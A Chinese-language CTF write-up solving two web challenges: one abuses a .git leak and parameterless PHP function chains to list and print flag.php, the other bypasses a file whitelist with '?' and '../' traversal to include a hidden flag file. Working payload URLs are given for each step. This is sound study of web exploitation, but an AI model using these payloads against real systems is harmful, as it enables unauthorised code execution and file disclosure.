[GXYCTF2019]禁止套娃

1.打开页面只显示flag在哪里呢?

2.然后查看源码什么都没有，这样应该是扫描文件，然后看wp就是.git泄露，使用githack扫描到index.php

3.得到源码

4.看源码，可以利用的是exp

preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])这个意思应该是不能使用xxx(xxx)这种的，就是不能有参数

5.然后需要使用没有参数的函数

当scandir()传入'.'，可以列出当前目录的所有文件，而localeconv() 可以返回第一个键值为.，然后就使用payload：?exp=var_dump(scandir(current(localeconv())));，返回array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" }

6.看到flag.php文件，然后需要查看这个文件

使用payload：?exp=show_source(next(array_reverse(scandir(current(localeconv())))));最后得到flag

[HCTF 2018]WarmUp

1.打开以后查看源码

if (! empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"; }

这个可以使用file进行传参，可以使用这个来寻找flag文件

2.看上面有一个hint.php文件，打开后显示flag not here, and flag in ffffllllaaaagggg，说明flag在ffffllllaaaagggg中

3.传参file需要满足非空，是字符串，还得通过emmm:checkfile的检查才能使用

看file有一个白名单

4.然后可以通过source.php?file=source.php?来通过检查最后使用source.php?file=source.php?../ffffllllaaaagggg但是并没有返回flag

5.继续添加../进行前移，最后使用source.php?file=source.php?../../../../../ffffllllaaaagggg得到了flag
